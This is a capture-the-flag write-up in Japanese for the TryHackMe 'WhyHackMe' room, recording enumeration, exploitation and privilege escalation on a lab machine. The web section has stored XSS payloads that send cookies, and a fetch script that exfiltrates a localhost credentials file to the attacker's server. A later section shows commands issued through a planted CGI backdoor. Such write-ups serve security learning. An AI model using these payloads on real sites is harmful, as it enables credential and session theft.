# WhyHackMe CTF

https://tryhackme.com/room/whyhackme

## Enumeration

```shell
TARGET=10.10.32.98
sudo bash -c "echo $TARGET   whyhackme.thm >> /etc/hosts"
```

### ポートスキャン

```shell
root@ip-10-10-150-43:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-09 07:57 BST
Nmap scan report for whyhackme.thm (10.10.32.98)
Host is up (0.034s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
80/tcp    open     http
41312/tcp filtered unknown
MAC Address: 02:8A:69:0D:DB:57 (Unknown)
```

### FTP

```sh
$ ftp $TARGET
Connected to 10.10.32.98.
220 (vsFTPd 3.0.3)
Name (10.10.32.98:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||28992|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        119          4096 Mar 14  2023 .
drwxr-xr-x    2 0        119          4096 Mar 14  2023 ..
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
```

```sh
$ cat update.txt
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account.
- admin
```

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://whyhackme.thm -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://whyhackme.thm/assets/]
/blog.php             (Status: 200) [Size: 3102]
/cgi-bin/             (Status: 403) [Size: 278]
/config.php           (Status: 200) [Size: 0]
/dir                  (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 563]
/login.php            (Status: 200) [Size: 523]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/register.php         (Status: 200) [Size: 643]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

/register.php からユーザー登録し、ログインできた。

コメントの本文に XSS を試したが、タグがそのまま表示されるだけで失敗した。

```
good<script>document.write('<img src="http://10.13.85.243:8000/' + document.cookie + '">')</script>
```

コメント投稿時、自分の名前が表示されているので、名前自体を

```
good<script>document.write('<img src="http://10.13.85.243:8000/' + document.cookie + '">')</script>
```

にして登録し、コメント投稿する。

```sh
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.32.98 - - [09/Jun/2025 16:55:02] "GET / HTTP/1.1" 200 -
10.10.32.98 - - [09/Jun/2025 16:56:02] "GET / HTTP/1.1" 200 -
```

リクエストが来たが、Cookie は取れなかった。

SSRF で/dev/pass.txt をリクエストさせ、さらにそれを攻撃マシンに送信させる。

```js
<script>fetch("http://127.0.0.1/dir/pass.txt").then(r => r.text()).then(t => fetch("http://10.13.85.243:8000/"+encodeURIComponent(t), {mode:"no-cors"}))</script>
```

```sh
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.206.200 - - [09/Jun/2025 19:02:03] "GET /[REDACTED] HTTP/1.1" 404 -
```

URL デコードすると、jack の認証情報になる。

## 権限昇格

```sh
jack@ubuntu:~$ sudo -l
[sudo] password for jack:
Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```

https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/

iptables-save とセットであれば、任意のファイルを上書きしたりできるようだが、そうではないので悪用方法が分からない。

```sh
jack@ubuntu:~$ cat /var/www/html/config.php
<?php
$servername = "localhost";
$username = "root";
$password = "MysqlPasswordIsPrettyStrong";
$dbname = "commentDB";
?>
```

MySQL に接続したが、分かったのは admin ユーザーのハッシュ値のみ。

```sh
jack@ubuntu:~$ ls -al /opt
total 40
drwxr-xr-x  2 root root  4096 Aug 16  2023 .
drwxr-xr-x 19 root root  4096 Mar 14  2023 ..
-rw-r--r--  1 root root 27247 Aug 16  2023 capture.pcap
-rw-r--r--  1 root root   388 Aug 16  2023 urgent.txt
```

urgent.txt

```
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
```

```sh
jack@ubuntu:/opt$ ls -al /usr/lib
total 1144
drwxr-xr-x 91 root root     4096 Jan 29  2024 .
drwxr-xr-x 14 root root     4096 Aug 31  2022 ..
...
drwxr-x---  2 root h4ck3d   4096 Aug 16  2023 cgi-bin
```

```sh
jack@ubuntu:/opt$ sudo iptables -S
[sudo] password for jack:
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A INPUT -p tcp -m tcp --dport 41312 -j DROP
-A INPUT -i lo -j ACCEPT
-A INPUT -m conntrack --ctstate NEW,RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
-A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT
-A INPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT
-A INPUT -j DROP
-A OUTPUT -o eth0 -j ACCEPT
```

```sh
jack@ubuntu:/opt$ netstat -nlvp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:41312           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
```

41312 ポートがバックドアになっていて、現状は iptables の設定でブロックされているとのこと。

バックドアを使いたいので、ルールを削除。

```sh
jack@ubuntu:/opt$ sudo iptables -D INPUT -p tcp --dport 41312 -j DROP
```

nc で接続はできるが、反応が無い状態。pcap を解析する必要がありそう。

```sh
$ nc 10.10.206.200 41312
```

capture.pcap を見て、TLS で暗号化されていることだけわかった。

```sh
# Verification error: certificate has expired ignore
$ openssl s_client -connect 10.10.7.14:41312

# Verification error: self-signed certificate
$ openssl s_client -no_check_time -connect 10.10.7.14:41312

# 証明書の部分をファイル保存。Verify成功。
# 適当に入力すると、HTTP応答（Bad Request）が返された。
$ openssl s_client -no_check_time -connect 10.10.7.14:41312 -CAfile ./CA

...

a
HTTP/1.1 400 Bad Request
Date: Tue, 10 Jun 2025 07:41:41 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 308
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at www.example.com Port 443</address>
</body></html>
closed
```

Firefox で接続しても BadRequest が返っており使い方は不明、パケットキャプチャを解析するにはサーバー側の秘密鍵が必要。

```sh
jack@ubuntu:~$ cd /etc/apache2/certs
jack@ubuntu:/etc/apache2/certs$ ls -al
total 16
drwxr-xr-x 2 root root 4096 Mar 14  2023 .
drwxr-xr-x 9 root root 4096 Aug 16  2023 ..
-rw-r--r-- 1 root root 2025 Feb 26  2022 apache-certificate.crt
-rw-r--r-- 1 root root 3272 Feb 26  2022 apache.key
```

秘密鍵があった。これを Wireshark に設定する。

1. Edit - Preferences - Protocol - TLS - RSA key lists
2. IP:10.133.71.33
3. Port:41312
4. Protocol:tcp
5. Key File: apache.key

HTTP リクエストが見えて、コマンド実行の方法が分かった。

```http
GET /cgi-bin/[REDACTED].py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=ls%20-al HTTP/1.1
Host: 10.0.2.15:41312
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1


HTTP/1.1 200 OK
Date: Wed, 16 Aug 2023 14:35:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 122
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html


<h2>total 12
drwxr-xr-x  2 root root 4096 Aug 16 14:29 .
drwxr-xr-x 91 root root 4096 Mar 14 05:40 ..
-rwxr-xr-x  1 root root  456 Aug 16 14:20 5UP3r53Cr37.py
<h2>
```

権限は h4ck3d グループ。

```sh
id
uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
```

無制限 sudo が付いているのでなんでもできる。

```sh
sudo -l
Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on ubuntu: (ALL : ALL) NOPASSWD: ALL
```

/root ディレクトリ

```sh
sudo ls -al /root
total 56 drwx------ 7 root root 4096 Jan 29 2024 . drwxr-xr-x 19 root root 4096 Mar 14 2023 .. lrwxrwxrwx 1 root root 9 Mar 14 2023 .bash_history -> /dev/null -rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc -rw-r--r-- 1 root root 172 Mar 15 2023 bot.py drwx------ 3 root root 4096 Aug 16 2023 .cache drwx------ 3 root root 4096 Aug 17 2023 .config -rw------- 1 root root 33 Jan 29 2024 .lesshst drwxr-xr-x 3 root root 4096 Mar 14 2023 .local lrwxrwxrwx 1 root root 9 Mar 14 2023 .mysql_history -> /dev/null -rw-r--r-- 1 root root 161 Dec 5 2019 .profile -r-------- 1 root root 33 Mar 14 2023 root.txt -rw-r--r-- 1 root root 66 Jan 29 2024 .selected_editor drwx------ 5 root root 4096 Mar 14 2023 snap drwx------ 2 root root 4096 Mar 14 2023 .ssh -rwxr-xr-x 1 root root 82 Jan 29 2024 ssh.sh
```

ルートフラグ

```sh
sudo cat /root/root.txt
```

## 振り返り

- SSRF で、`http://127.0.0.1/dir/pass.txt` は成功するが、`http://localhost/dir/pass.txt` では機能しなかった。そこに気付かず時間がかかった。
- /etc/apache2/certs に HTTPS サーバー秘密鍵があるのは勉強になった。
